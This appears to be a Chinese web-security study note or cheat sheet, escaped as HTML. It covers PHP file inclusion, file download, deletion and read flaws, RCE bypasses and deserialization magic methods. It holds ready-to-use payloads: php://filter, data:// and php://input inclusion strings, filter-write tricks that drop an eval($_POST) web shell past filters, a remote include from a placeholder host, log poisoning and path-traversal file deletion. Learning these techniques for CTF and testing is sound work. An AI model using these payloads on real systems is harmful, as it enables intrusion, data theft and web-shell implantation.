&lt;h3 id=&#34;lfi-rfi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-rfi&#34;&gt;#&lt;/a&gt; LFI、RFI&lt;/h3&gt;
&lt;h4 id=&#34;lfi-定义-利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-定义-利用&#34;&gt;#&lt;/a&gt; LFI 定义 利用&lt;/h4&gt;
&lt;p&gt;（1）文件包含 lfi 定义：&lt;/p&gt;
&lt;p&gt;php 中的 include 函数，如果其后跟上了一个固定的文件，那么就会在加载原来的文件的时候执行 include 所包含的文件且不论这个文件是以何种后缀结尾都会被解析成 php；如果包含的是个由用户可以控制的文件，那么就存在文件包含漏洞，用户可以指定需要包含的文件进行恶意的读取相关敏感数据或者造成权限丢失。&lt;/p&gt;
&lt;p&gt;（2）文件包含 LFI 漏洞利用：&lt;/p&gt;
&lt;p&gt;配合文件上传，上传带图片马，用文件包含此图片，脚本代码会被触发。&lt;/p&gt;
&lt;p&gt;配合日志文件，日志文件会记录 UA 信息，修改 UA 为后门代码，包含即可执行后门代码。&lt;/p&gt;
&lt;p&gt;配合伪协议，利用没有被禁的协议，用 php 伪协议读写文件或者写入后门。&lt;/p&gt;
&lt;p&gt;配合会话文件，配合网站后台的 session 目录及其内容使用，每一次访问都会生成一个新的 seesion，而在 php 中是可以通过控制访问网站时的 cookie 值来改变服务器存储的 session 文件名以及通过 post 数据可以改变 session 存储文件中的内容。&lt;/p&gt;
&lt;h4 id=&#34;lfi-配合伪协议使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-配合伪协议使用&#34;&gt;#&lt;/a&gt; LFI 配合伪协议使用&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;php://filter使用较多，可以直接读取相关文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=php://filter/read=convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;php://input协议需要开启一些开关才可以使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=php://input post:&amp;lt;?php system(&amp;#x27;tac flag.php&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;远程包含需要对方在.php.ini中开启相关开关才能使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=http://www.xxx.com/1.txt 1.txt:&amp;lt;?php system(&amp;#x27;tac flag.php&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用base 64 加密可以逃过一些防护措施的检测&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=data://text/plain,&amp;lt;?=system(&amp;#x27;tac flag.*&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用file协议时需要用到绝对路径，使用php伪协议时需要使用php关键字，需要使用远程包含需要服务器允许，相比之下写入日志没有那么多的限制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=/var/log/nginx/access.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;filter-伪协议加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#filter-伪协议加密&#34;&gt;#&lt;/a&gt; filter 伪协议加密&lt;/h4&gt;
&lt;p&gt;php://filter/write 的加密编码：(伪协议可使用但相关字段被绕过的情况)&lt;/p&gt;
&lt;p&gt;将 php://filter/write=convert.base64-decode/resource=123.php 进行 url 编码， 浏览器会自动进行一次 url 解码，将 content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg== 通过 post 的方式上传，意味着将要对 123.php 的文件写入，写入的内容为 content 内容解码后的数据，采用这种方法需要就实际场景进行构造。&lt;/p&gt;
&lt;p&gt;将 php://filter/write=string.rot13/resource=2.php 进行 url 编码，rot13 表示的是 写入的文件是采用凯撒加密偏移量为 13，将 content=&lt;?cuc riny($_CBFG[1]);?&gt; 通过 post 方式上传，在 base64 被过滤的情况下可以使用此方法绕过。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;result = iconv(&lt;span class=&#34;string&#34;&gt;&amp;quot;UCS-2LE&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;UCS-2BE&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php eval($_POST[a]);?&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;经过一次反转:&amp;quot;.$result.&amp;quot;\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;经过第二次反转:&amp;quot;.iconv(&amp;quot;UCS-2LE&amp;quot;,&amp;quot;UCS-2BE&amp;quot;, $result);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;contents=?&amp;lt;hp pvela$(P_SO[T]a;)&amp;gt;?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果include中的内容默认添加前缀可以用../的方式读取一些文件，但却不能用伪协议了，如果是有增加后缀的方法，则无法读取文件。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;文件操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件操作&#34;&gt;#&lt;/a&gt; 文件操作&lt;/h3&gt;
&lt;h4 id=&#34;敏感文件下载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#敏感文件下载&#34;&gt;#&lt;/a&gt; 敏感文件下载&lt;/h4&gt;
&lt;p&gt;（1）文件下载的寻找及利用：&lt;/p&gt;
&lt;p&gt;文件下载：流程 - 功能点抓包 - 寻代码文件 - 寻变量控制 - 构造测试。&lt;/p&gt;
&lt;p&gt;寻找：/1.pdf 不存在此漏洞，/?file=1.pdf 可能存在。&lt;/p&gt;
&lt;p&gt;利用：后台首页日志文件、数据库配置文件、中间件配置文件、各种接口文件、密钥信息等文件、扫描工具爬行；或者下载好的代码去分析路径、找到对方的 cms 直接查数据库配置文件。&lt;/p&gt;
&lt;p&gt;（2）代码中的文件下载漏洞：&lt;/p&gt;
&lt;p&gt;java：如何发现了下载漏洞但是 get 方法无法获取到文件，可以尝试切换到 post 或者其他提交方式进行下载，javaWEB 中 WEB 的配置文件 WEB-INF/web.xml，里边有很多重要的信息，配置文件中的 com.wm.ctf.FlagController 表示实际中的 WEB-INF/classes/com/wm/ctf/ FlagController.class。&lt;/p&gt;
&lt;p&gt;php：如果需要登陆可以点击登陆分析数据包。分析 url 地址判断是可能存在哪种漏洞，判断对方是根据哪个关键字识别是否登陆的，如果有 mvc 的框架，可尝试下载 module 中的敏感文件如…xx…/etc/nginx/nginx.conf。&lt;/p&gt;
&lt;h4 id=&#34;恶意文件删除&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#恶意文件删除&#34;&gt;#&lt;/a&gt; 恶意文件删除&lt;/h4&gt;
&lt;p&gt;文件删除：流程 - 特定函数搜索 - 寻触发调用 - 构造 Payload 测试&lt;/p&gt;
&lt;p&gt;Payload: /admin/admin_article.php?act=del_img&amp;amp;img=…/…/data/install.lock&lt;/p&gt;
&lt;p&gt;在网站某些功能点可以删除文件时，抓包测试，如后台模版删除文件点进行删除测试，删除 install/install_lock.txt 删除后则重新安装网站。&lt;/p&gt;
&lt;h4 id=&#34;重要文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#重要文件读取&#34;&gt;#&lt;/a&gt; 重要文件读取&lt;/h4&gt;
&lt;p&gt;文件读取：流程 - 特定函数搜索 - 寻触发调用 - 构造 Payload 测试&lt;/p&gt;
&lt;p&gt;Payload：/include/thumb.php?dir=http…\config\config_db.php&lt;/p&gt;
&lt;p&gt;如果能够显示源代码则是文件读取漏洞&lt;/p&gt;
&lt;h4 id=&#34;黑盒探针&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#黑盒探针&#34;&gt;#&lt;/a&gt; 黑盒探针&lt;/h4&gt;
&lt;p&gt;（1）URL 参数名及参数值分析：&lt;br&gt;
参数名：英文对应翻译&lt;br&gt;
参数值：目录或文件名&lt;/p&gt;
&lt;p&gt;（2）功能点自行修改后分析：&lt;br&gt;
文件下载，删除，读取等&lt;/p&gt;
&lt;h3 id=&#34;rce漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce漏洞&#34;&gt;#&lt;/a&gt; RCE 漏洞&lt;/h3&gt;
&lt;p&gt;（1）RCE 漏洞分类&lt;/p&gt;
&lt;p&gt;代码执行：引用脚本代码解析执行，如 eval (‘phpinfo ();’);&lt;/p&gt;
&lt;p&gt;命令执行：脚本调用操作系统命令，如 system (‘ipconfig’);&lt;/p&gt;
&lt;p&gt;在源码中要找 RCE 漏洞话需要搜索特定函数，看其是从哪里输入进来的，有哪些过滤是否能绕过；如果没有源码的情况就得去从功能点测试。&lt;/p&gt;
&lt;p&gt;（2）漏洞函数&lt;/p&gt;
&lt;p&gt;PHP：eval ()、assert ()、preg_replace ()、call_user_func ()、call_user_func_array () 以及 array_map () 等；system、shell_exec、popen、passthru、proc_open 等&lt;/p&gt;
&lt;p&gt;Python：eval exec subprocess os.system commands&lt;/p&gt;
&lt;p&gt;Java：Java 中没有类似 php 中 eval 函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL 等.&lt;/p&gt;
&lt;p&gt;（3）RCE 漏洞绕过方法&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;基本绕过方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system(&amp;#x27;tac fla*.php&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp fla*.ph* 2.txt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo shell_exec(&amp;#x27;tac fla*.ph*&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;传递参数，在拼接新的变量值可以绕过敏感函数被过滤的限制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;eval($&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;_GET[1]);&amp;amp;1=system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;tac flag.php&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过文件包含，传递a参数为执行系统命令的data协议，可以绕过分号限制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;include$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;_GET[a]?&amp;gt;&amp;amp;a=data://text/plain,&amp;lt;?=system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;tac flag.php&amp;#x27;&lt;/span&gt;);?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;include$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;_GET[a]?&amp;gt;&amp;amp;a=php://filter/read=convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data://text/plain,&amp;lt;?=system(&amp;#x27;tac fla*&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php://input post:&amp;lt;?php system(&amp;#x27;tac flag.php&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;工具推荐 GUI_TOOLS_V.. 是一个工具集成化的工具箱&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;反序列化漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反序列化漏洞&#34;&gt;#&lt;/a&gt; 反序列化漏洞&lt;/h3&gt;
&lt;h4 id=&#34;php-魔术方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-魔术方法&#34;&gt;#&lt;/a&gt; php 魔术方法&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;php中有类的反序列化中常见的魔术方法:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__construct()//创建对象时触发,执行unserialize()时如果不new是不会触发这个函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct() //对象被销毁时触发，执行unserialize()时销毁阶段会触发这个函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__toString() //对象被当作字符串时被调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__call() //当调用类中不存在的方法时，就会调用call()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__get() //当调用类中不存在的属性时，就会调用get()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set() //当设置类中不存在的属性时，就会调用set()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep() //当执行serialize()方法时，就会调用sleep()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__wakeup() //当执行unserialize()时，就会调用wakeup()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup，即CVE-2016-7124&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isset() //当对不可访问属性调用isset()或empty()时，就会调用__isset()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__unset() //当对不可访问属性调用unset()时触发，销毁对象的某个属性时执行此函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;实例化之后访问private是不可访问的，但是访问public是可以访问的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__invoke() //将对象当做函数来使用时执行此方法，通常不推荐这样做&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看php魔术方法的原生类有哪些：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;classes = get_declared_classes();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;foreach ($classes as $class) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;  $&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;methods = get_class_methods(&lt;span class=&#34;variable&#34;&gt;$class&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  foreach ($methods as $method) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (in_array($method, array (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__destruct&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__toString&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__wakeup&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__call&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__callStatic&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__get&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__set&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__isset&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__unset&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__invoke&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;__set_state&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print $class. &amp;#x27;::&amp;#x27;. $method. &amp;quot;\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;php-反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-反序列化&#34;&gt;#&lt;/a&gt; php 反序列化&lt;/h4&gt;
&lt;p&gt;(1) php 反序列化漏洞原理:&lt;/p&gt;
&lt;p&gt;未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过 程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过 程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中 的一些魔术方法。&lt;/p&gt;
